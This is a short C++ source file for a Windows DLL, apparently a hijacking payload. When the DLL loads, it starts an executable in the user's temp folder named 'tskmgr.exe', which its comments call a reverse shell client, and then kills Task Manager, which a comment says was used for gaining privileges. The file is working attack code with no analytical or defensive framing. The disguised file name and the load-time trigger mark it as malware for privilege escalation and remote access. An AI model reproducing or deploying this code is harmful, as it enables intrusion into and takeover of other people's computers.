#include <iostream>
#include <Windows.h>

#define DLL_EXPORT

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		// Extract Temp Path of User from Environment Variable
		LPTSTR env_tmp;
		env_tmp = (LPTSTR)malloc(255 * sizeof(TCHAR));
		GetEnvironmentVariable(TEXT("temp"), env_tmp, 255);
		std::wstring ws(env_tmp);
		std::string tmp_path(ws.begin(), ws.end());
		
		tmp_path += "\\tskmgr.exe d";
		
		LPSTR command = const_cast<char*>(tmp_path.c_str());

		// Run Reverse Shell Client
		CreateProcessA(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		system("taskkill /IM Taskmgr.exe"); // Close Task Manager that was used for privileging

	}
	return TRUE;
}